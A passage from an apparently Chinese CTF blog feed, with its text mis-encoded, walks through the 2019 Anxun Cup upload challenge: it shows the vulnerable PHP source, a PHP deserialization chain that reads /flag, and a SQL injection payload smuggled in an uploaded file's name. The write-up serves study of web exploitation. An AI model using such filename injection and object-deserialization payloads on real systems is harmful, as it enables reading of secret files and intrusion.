class="token operator">-></span><span class="token property">con</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>upload.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./helper.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">upload</span> <span class="token keyword">extends</span> <span class="token class-name">helper</span> <span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">upload_base</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Upload file failed."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span><span class="token operator">-></span><span class="token function">upload_base</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">helper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>helper.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">helper</span> <span class="token punctuation">&#123;</span><span class="token keyword">protected</span> <span class="token variable">$folder</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"pic/"</span><span class="token punctuation">;</span><span class="token keyword">protected</span> <span class="token variable">$ifview</span> <span class="token operator">=</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span><span class="token keyword">protected</span> <span class="token variable">$config</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"config.txt"</span><span class="token punctuation">;</span><span class="token comment">// The function is not yet perfect, it is not open yet.</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">upload</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token operator">=</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$fileinfo</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getfile</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"title"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$fileinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"filename"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$fileinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"ext"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$fileinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ext'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"path"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$fileinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'path'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$img_ext</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$input</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$my_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"width"</span><span class="token operator">=></span><span class="token variable">$img_ext</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"height"</span><span class="token operator">=></span><span class="token variable">$img_ext</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"attr"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$my_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">save</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$id</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Something wrong!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p>Your images is uploaded successfully. And your image's id is <span class="token interpolation"><span class="token variable">$id</span></span>.&lt;/p>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getfile</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$rs</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$input</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token variable">$rs</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$basename</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cate_exts</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"jpg"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"gif"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"png"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jpeg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token variable">$cate_exts</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;p>Please upload the correct image file!!!&lt;/p>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    <span class="token variable">$title</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token operator">.</span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'title'</span><span class="token operator">=></span><span class="token variable">$title</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'filename'</span><span class="token operator">=></span><span class="token variable">$basename</span><span class="token operator">.</span><span class="token string double-quoted-string">"."</span><span class="token operator">.</span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'ext'</span><span class="token operator">=></span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'path'</span><span class="token operator">=></span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">folder</span><span class="token operator">.</span><span class="token variable">$basename</span><span class="token operator">.</span><span class="token string double-quoted-string">"."</span><span class="token operator">.</span><span class="token variable">$ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">save</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$data</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Something wrong!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">insert_array</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token variable">$id</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">insert_array</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$con</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"127.0.0.1"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"pic_base"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_connect_errno</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Connect MySQL Fail:"</span><span class="token operator">.</span><span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$sql_fields</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql_val</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$data</span> <span class="token keyword">as</span> <span class="token variable">$key</span><span class="token operator">=></span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$key_temp</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'*'</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\0\0\0'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$value_temp</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'*'</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\0\0\0'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql_fields</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"`"</span><span class="token operator">.</span><span class="token variable">$key_temp</span><span class="token operator">.</span><span class="token string double-quoted-string">"`"</span><span class="token punctuation">;</span><span class="token variable">$sql_val</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"'"</span><span class="token operator">.</span><span class="token variable">$value_temp</span><span class="token operator">.</span><span class="token string double-quoted-string">"'"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"INSERT INTO images ("</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">","</span><span class="token punctuation">,</span><span class="token variable">$sql_fields</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">") VALUES("</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">","</span><span class="token punctuation">,</span><span class="token variable">$sql_val</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">")"</span><span class="token punctuation">;</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">mysqli_insert_id</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token variable">$id</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">view_files</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">ifview</span> <span class="token operator">==</span> <span class="token constant boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span><span class="token comment">//The function is not yet perfect, it is not open yet.</span><span class="token punctuation">&#125;</span><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$content</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment"># Read some config html</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token function">view_files</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">config</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨helper.phpä¸­ï¼Œæ˜æ˜¾æœ‰ä¸ªè¯»å–flagçš„åœ°æ–¹ã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210814151722029.png"></p><p>å†æ ¹æ®å‰æ–¹çš„ä»£ç å¯æ¨æ˜¯ååºåˆ—åŒ–é¢˜ã€‚</p><p>æ‰€ä»¥å°è¯•æ„é€ popé“¾ï¼š</p><pre class="line-numbers language-none"><code class="language-none">helper::view_files &lt;- helper::__destruct()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ¢³ç†ä¸‹æ€è·¯ï¼š</p><p>ä¸Šä¼ ç‰¹æ®Šå›¾ç‰‡ï¼Œå†…å«æ„é€ å¥½çš„payloadï¼Œå†™å…¥æ•°æ®åº“</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210814153033263.png"></p><p>ç„¶åæ•°æ®åº“æŸ¥è¯¢ï¼Œååºåˆ—åŒ–ï¼Œè§¦å‘popé“¾</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210814153254467.png"></p><h3 id="ååºåˆ—åŒ–æ„é€ "><a href="#ååºåˆ—åŒ–æ„é€ " class="headerlink" title="ååºåˆ—åŒ–æ„é€ "></a>ååºåˆ—åŒ–æ„é€ </h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">helper</span><span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$ifview</span> <span class="token operator">=</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$config</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/flag"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">helper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>bin2hex()å‡½æ•°æŠŠASCIIå­—ç¬¦çš„å­—ç¬¦ä¸²è½¬æ¢ä¸ºåå…­è¿›åˆ¶å€¼ã€‚å­—ç¬¦ä¸²å¯é€šè¿‡ä½¿ç”¨pack()å‡½æ•°å†è½¬æ¢å›å»</p></blockquote><blockquote><p>mysqlä¼šè‡ªåŠ¨å°†åå…­è¿›åˆ¶è½¬åŒ–ä¸ºå­—ç¬¦ä¸²ï¼Œè¿™ä¹Ÿæ˜¯sqlæ³¨å…¥çš„å¯åˆ©ç”¨ç‚¹</p></blockquote><pre class="line-numbers language-none"><code class="language-none">4f3a363a2268656c706572223a323a7b733a393a22002a00696676696577223b623a313b733a393a22002a00636f6e666967223b733a353a222f666c6167223b7d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="SQLæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a>SQLæ³¨å…¥</h3><p>è€Œåœ¨ä»£ç ä¸­ï¼Œå”¯ä¸€å¯æ§çš„å°±æ˜¯filenameï¼Œå»æ‰åç¼€å°±æ˜¯titleã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210814155555593.png"></p><p>ç„¶åè¿™ä¸ªtitleä¼šè¢«å†™å…¥åˆ°æ•°æ®åº“é‡Œï¼Œ</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210814160327517.png"></p><p><code>$array</code>çš„é•¿åº¦ä¸º5ï¼Œè¿˜åŠ äº†å•å¼•å·é—­åˆï¼Œæœ€åé¢è¿˜æœ‰ä¸ªå°æ‹¬å·ï¼Œsqlè¯­å¥ä¸ºï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> images <span class="token punctuation">(</span><span class="token punctuation">`</span>title<span class="token punctuation">`</span><span class="token punctuation">,</span><span class="token punctuation">`</span>filename<span class="token punctuation">`</span><span class="token punctuation">,</span><span class="token punctuation">`</span>ext<span class="token punctuation">`</span><span class="token punctuation">,</span><span class="token punctuation">`</span>path<span class="token punctuation">`</span><span class="token punctuation">,</span><span class="token punctuation">`</span>attr<span class="token punctuation">`</span><span class="token punctuation">)</span> <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'5'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>äºæ˜¯ï¼Œpayloadä¸º</p><pre class="line-numbers language-none"><code class="language-none">a&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,0x4f3a363a2268656c706572223a323a7b733a393a22002a00696676696577223b623a313b733a393a22002a00636f6e666967223b733a353a222f666c6167223b7d)#.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¸Šä¼ ä¸‹ï¼Œç‚¹å¼€show.phpï¼Œç»“æŸã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210814161212141.png"></p><h3 id="æ‰©å±•"><a href="#æ‰©å±•" class="headerlink" title="æ‰©å±•"></a>æ‰©å±•</h3><p>ç¬¬ä¸€æ¬¡è§<code>foreach</code>é‡Œçš„<code>$sql_val[]</code>è¿™ç§ç”¨æ³•ï¼Œå¤§æ¦‚æ„æ€å°±æ˜¯ä¼šè‡ªåŠ¨ç´¢å¼•foreachçš„ä¸‹æ ‡ã€‚æŒºå¦™çš„ï¼Œè®°å½•ä¸€ä¸‹ã€‚</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$sql_val</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$data</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$sql_val</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"++"</span> <span class="token operator">.</span> <span class="token variable">$value</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"++"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$sql_val</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">array(4) &#123; [0]&#x3D;&gt; string(5) &quot;++1++&quot; [1]&#x3D;&gt; string(5) &quot;++2++&quot; [2]&#x3D;&gt; string(5) &quot;++3++&quot; [3]&#x3D;&gt; string(5) &quot;++4++&quot; &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[çº¢æ˜è°·CTF 2021]write_shell</title>
      <link href="/p/1139417858.html"/>
      <url>/p/1139417858.html</url>
      
